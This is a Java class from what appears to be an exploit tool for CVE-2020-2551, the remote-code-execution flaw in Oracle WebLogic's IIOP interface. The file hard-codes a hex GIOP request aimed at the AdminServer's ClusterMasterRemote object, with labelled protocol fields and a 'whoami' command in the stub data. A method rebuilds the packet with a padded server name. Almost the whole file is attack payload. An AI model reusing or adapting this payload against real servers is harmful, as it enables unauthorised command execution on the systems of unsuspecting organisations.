package CVE20202551;

import org.python.parser.ast.Str;
import util.SocketUtil;

import java.net.Socket;

/**
 * @ClassName: Payload1Data
 * @Description: TODO
 * @Author: Summer
 * @Date: 2020/12/11 17:03
 * @Version: v1.0.0
 * @Description: 回显data
 **/
public class Payload1Data {

    public String data1 = "47494f5001020000000001320000000303000000000000000000008800424541080103000000000c41646d696e536572766572000000000000000044524d493a7765626c6f6769632e636c75737465722e73696e676c65746f6e2e436c75737465724d617374657252656d6f74653a30303030303030303030303030303030000000000433323600000000014245412c0000001000000000000000006f36cecc1a3878bb000000126765745365727665724c6f636174696f6e00000000000003000000050000001c00000000000000010000000e3139322e3136382e3133372e31007725000000010000000c0000000000010020050100014245410000000004000a0301000000007fffff020000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e3000000000000677686f616d69";
    String GIOPHeader = "47494f50"; //GIOP
    String Version = "0102"; // 1.2
    String MessageType = "0000"; // 信息类型
    String MessageSize = "00000132"; // 信息大小
    String RequestId = "00000003"; //
    String ResponeFlags = "03";
    String Reserved = "000000";
    String TargetAdd = "00000000"; //Target Address
    String KeyAddLength = "00000088";
    public String ServerName = "00424541080103000000000c41646d696e536572766572"; //AdminServer
    String KeyAddress = "0044524d493a7765626c6f6769632e636c75737465722e73696e676c65746f6e2e436c75737465724d617374657252656d6f74653a30303030303030303030303030303030000000000433303700000000014245412a000000100000000000000000b6e81da176247a6e";
    String OperationLength = "0000001267";
    String RequestOperation = "65745365727665724c6f636174696f6e00";
    String SequenceLength = "000000000003"; //前面补00 00
    String SericeContext = "00000005";
    String SequenceLength2 = "0000001c";
    String Endianness = "00";
    String ContextData = "000000000000010000000e3139322e3136382e3133372e310077";
    String Zimu = "20";//u
    String SericeContext2 = "000000010000000c000000000001002005010001";
    String SericeContext3 = "4245410000000004000a0301";
    // 前面补充0000 0000
    String StubData = "000000007fffff020000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e3000000000000677686f616d69";

    String datas = GIOPHeader+Version+MessageType+MessageSize+RequestId+ResponeFlags+Reserved+TargetAdd+KeyAddLength+ServerName+KeyAddress+OperationLength+RequestOperation+SequenceLength+SericeContext+SequenceLength2+Endianness+ContextData+Zimu+SericeContext2+SericeContext3+StubData;


    public String getDatas() {
        return datas;
    }

    public void setDatas(String datas) {
        this.datas = datas;
    }

    public String getData1() {
        return data1;
    }

    public void setData1(String data1) {
        this.data1 = data1;
    }

    public String getServerName() {
        return ServerName;
    }

    public void setServerName(String serverName) {
        ServerName = serverName;
    }


    public String toString() {
        String a = getServerName();
        if(a.length()<60){
            a = SocketUtil.addZeroForNum(a,60);
        }
        String datas2 = GIOPHeader+Version+MessageType+MessageSize+RequestId+ResponeFlags+Reserved+TargetAdd+KeyAddLength+a+KeyAddress+OperationLength+RequestOperation+SequenceLength+SericeContext+SequenceLength2+Endianness+ContextData+Zimu+SericeContext2+SericeContext3+StubData;

        return datas2;
    }
}
